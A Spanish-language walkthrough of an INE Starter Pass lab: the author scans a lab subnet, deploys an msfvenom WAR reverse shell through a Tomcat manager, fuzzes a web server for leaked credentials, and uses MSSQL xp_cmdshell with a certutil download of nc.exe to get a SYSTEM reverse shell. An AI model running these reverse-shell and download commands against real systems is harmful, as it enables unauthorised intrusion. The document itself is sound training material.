Black Box 1 de 3 del Starter Pass de INE. En este caso estamos en un segmento de red 172.16.64.0/24(abarca desde la 172.16.64.0 hasta la 172.16.64.255)

1 - [Reconocimiento inicial](#recon)

2 - [Explotamos la 172.16.64.101](#maquina1)

3 - [Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199](#maquina2)

4 - [Credenciales ocultas para 172.16.64.182](#maquina3)

# Reconocimiento inicial {#recon}
Ya que no tenemos una IP en específico para atacar, tocará hacer un escaneo de `nmap`
a todo el segmento de red.

```bash
# Nmap 7.92 scan initiated Wed Sep  8 12:12:56 2021 as: nmap -p- --open -sC -sV -sS --min-rate 3000 -n -oN scan 172.16.64.0/24
Nmap scan report for 172.16.64.101
Host is up (0.17s latency).
Not shown: 65529 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)
8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
9080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache-Coyote/1.1
59919/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:50:56:A2:EC:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.64.140
Host is up (0.20s latency).
Not shown: 65478 closed tcp ports (reset), 56 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: 404 HTML Template by Colorlib
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:50:56:A2:E5:76 (VMware)

Nmap scan report for 172.16.64.182
Host is up (0.16s latency).
Not shown: 65420 closed tcp ports (reset), 114 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)
MAC Address: 00:50:56:A2:5E:B5 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.64.199
Host is up (0.16s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
|_ssl-date: 2021-09-08T10:16:07+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-08T08:07:38
|_Not valid after:  2051-09-08T08:07:38
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49943/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-08T08:07:38
|_Not valid after:  2051-09-08T08:07:38
|_ssl-date: 2021-09-08T10:16:07+00:00; +2s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
MAC Address: 00:50:56:A2:0A:0F (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   172.16.64.199:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_nbstat: NetBIOS name: WIN10, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a2:0a:0f (VMware)
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-08T10:15:58
|_  start_date: 2021-09-08T08:07:22

Post-scan script results:
| ssh-hostkey: Possible duplicate hosts
| Key 2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA) used by:
|   172.16.64.101
|   172.16.64.182
| Key 256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA) used by:
|   172.16.64.101
|   172.16.64.182
| Key 256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519) used by:
|   172.16.64.101
|_  172.16.64.182
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  8 12:16:08 2021 -- 256 IP addresses (5 hosts up) scanned in 191.45 seconds
```


## Puertos abiertos

Bueno, tenemos 4 hosts disponibles con algunos puertos abiertos:
* 172.16.64.101
 
 | Puerto 	| Servicio                           	|
 |:-------	|:-----------------------------------	|
 | 22     	| SSH, para obtener una shell segura 	|
 | 8080   	| Apache Tomcat                      	|
 | 9080   	| Otro Apache Tomcat                 	|
 | 59919  	| Apache 2.4.18                      	| 
  
<br>

* 172.16.64.140

 | Puerto       | Servicio                              |
 |:-------      |:-----------------------------------   |
 | 80           | Apache 2.4.18                         |

<br>

* 172.16.64.182

 | Puerto       | Servicio                              |
 |:-------      |:-----------------------------------   |
 | 22           | SSH, para obtener una shell segura    |
 
<br>

* 172.16.64.199

| Puerto      	| Servicio                              	|
|:------------	|:--------------------------------------	|
| 135         	| msrpc                                 	|
| 139         	| SMB, recursos compartidos del sistema 	|
| 445         	| SMB, recursos compartidos del sistema 	|
| 1433        	| MicroSoft SQL                         	|
| 7680        	| pando-pub(ni idea)                    	|
| 49664-49670 	| msrpc                                 	|
| 49943       	| MicroSoft SQL(otra vez)               	|

Como he hecho un escaneo de la versión y el servicio además de lanzar unos scripts básicos de enumeración en el mismo escaneo, ya no necesito usar herramientas como [extractPorts](https://pastebin.com/tYpwpauW).


# Explotación de la 172.16.64.101 {#maquina1}

Teniendo todos los puertos podríamos empezar por la .101 por ejemplo. Si abrimos Firefox y entramos a los puertos de los servidores HTTP encontramos la misma página: ![imagen](https://user-images.githubusercontent.com/71317374/132499799-309aa1a6-7ee5-4d28-bfe8-7eda222d89a4.png)

## Explotación de un Apache Tomcat

Los servidores Apache Tomcat(puertos 8080 y 9080) tienen la ruta /manager/html, que te da acceso a la administración del sitio.

![imagen](https://user-images.githubusercontent.com/71317374/132499957-ac6e1dc9-9daa-4e50-9483-14953156a10e.png)

:/ No tenemos credenciales.

Si le damos a cancelar, nos lleva a una página con un 401 Unauthorized y unas credenciales:

![imagen](https://user-images.githubusercontent.com/71317374/132500059-7ae5f09f-6240-436a-9bdc-639b997d6ac3.png)

Y si las introducimos tenemos acceso a la administración del sitio.

![imagen](https://user-images.githubusercontent.com/71317374/132500156-bb495740-c4c6-4e42-bf51-1fbabcb1a18d.png)

Aquí puedes subir archivos .war que pueden ser maliciosos, así que podríamos obtener una reverse shell :0 

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=443 -f war > eeeee.war
```

Generamos un archivo .war llamado eeeee.war y lo subimos a la página web usando la sección de Deploy

![imagen](https://user-images.githubusercontent.com/71317374/132502557-3c8dffe0-a5ff-4b5a-9ac4-ad7f4497c30d.png)

Cuando le demos a Deploy aparecerá el nombre de nuestro archivo listado en Applications, pero antes vamos a la consola y abrimos un listener de netcat en el puerto 443
con `nc -nlvp 443`, y entonces le damos a nuestro archivo y conseguimos una reverse shell como el usuario tomcat8.

```bash
ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.16.64.101.
Ncat: Connection from 172.16.64.101:39542.
whoami
tomcat8
```

Para tener una consola totalmente interactiva, tendríamos que hacer un [tratamiento de la TTY](https://www.thehackersnow.com/tratamiento-de-una-tty/).
Ahora, hay que dirigirse a /home para recoger las flags de esta máquina, ubicadas en /home/adminels/Desktop y en /home/developer

# Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199 {#maquina2}

Tras comprometer la 172.16.64.101, nos dirigimos a la 172.16.64.140, que tiene un servidor HTTP corriendo el el puerto 80, así que vamos a fuzzearlo con la herramienta `wfuzz` a ver si encontramos algo.

```bash
 wfuzz -c --hc=404 -t 75 -w /usr/share/wordlists/directory-list-2.3-medium.txt 172.16.64.140/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.64.140/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000039:   301        9 L      28 W       312 Ch      "img"
000000553:   401        14 L     54 W       460 Ch      "project"
000000550:   301        9 L      28 W       312 Ch      "css"

Total time: 28.95585
Processed Requests: 7961
Filtered Requests: 7944
Requests/sec.: 274.9357
```

Entre todos, el que destaca es /project, si vamos ahí nos encontramos con un inicio de sesión.

![imagen](https://user-images.githubusercontent.com/71317374/132509149-aab25095-2e71-44b7-930f-39a153fd6d43.png)

Si introducimos las credenciales admin:admin nos autentica en la esta web, que está configurada por defecto.
Si hacemos fuzzing a /project con las credenciales admin:admin para autenticarnos(o el header "Authorization: Basic YWRtaW46YWRtaW4=") encontramos /backup, y si volvemos a fuzzear en /backup encontramos /test, donde hay unos documentos de texto.

Solo el tercero/sdadas.txt contiene unas credenciales para un servidor MSSQL(ubicado en la 172.16.64.199) y una ruta con una de las flags que hay que conseguir, que estaría en http://172.16.64.140/project/354253425234234/flag.txt

## Conseguimos acceso a la 172.16.64.199

Ahora que tenemos credenciales para el servidor MSSQL del puerto 1433, podemos usar la herramienta [mssqlclient.py](https://github.com/secureauthcorp/impacket/blob/master/examples/mssqlclient.py) de Impacket para conectarnos con las credenciales fooadmin:fooadmin

```bash
❯ mssqlclient.py fooadmin:fooadmin@172.16.64.199
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN10\FOOSQL): Line 1: Changed database context to 'master'.
[*] INFO(WIN10\FOOSQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL>
```

Y así llegamos al servidor SQL, del cual podemos sacar una shell con xp_cmdshell. Si escribimos "help" nos muestra una lista de comandos:

```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Habilitamos la consola con enable_xp_cmdshell y ejecutamos comandos con xp_cmdshell. Ya que no tenemos formas de enviarnos una reverse shell sin ningún programa, descargué un binario compilado de netcat(en Kali/Parrot hay uno) y mediante un servidor HTTP con Python y certutil.exe, me lo pude descargar y enviarme un cmd.exe a mi equipo.

Primero, creamos un servidor con Python en el puerto 80(si no sois root necesitaréis sudo) usando la librería http de esta forma: `python3 -m http.server 80` y usando certutil.exe lo descargamos en la máquina
con el comando `certutil.exe -urlcache -f http://tuip/nc.exe nc.exe`

Tras haberlo descargado, solo habría que ejecutarlo y con el parámetro -e enviar un cmd.exe a tu ip y el puerto en el que estés escuchando para conseguir acceso a esta máquina.

```bash
rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.16.64.199.
Ncat: Connection from 172.16.64.199:49678.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.
whoami
nt authority\system
```

# Credenciales para la 172.16.64.182 {#maquina3}
Y así, estamos casi metidos hasta la cocina, ya que nos faltaría una máquina por comprometer, la 172.16.64.182, que solo tiene el puerto 22 abierto.

Si miramos en el directorio Users encontramos varios usuarios, la flag está en C:\Users\AdminELS\Desktop, junto con lo que supuestamente es una clave pública de SSH:

```bash
type id_rsa.pub
<texto de relleno>jUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22################<relleno>
```
Pero si la miramos de cerca vemos unas credenciales para la máquina que falta por comprometer, que serían las credenciales developer:dF3334slKw. Si entramos por SSH a la 172.16.64.182, veremos la última flag y habremos comprometido todas las máquinas de esta Black Box.

Si te ha gustado puedes ir a mi [github](https://github.com/binlaab) y darme una estrellita :)
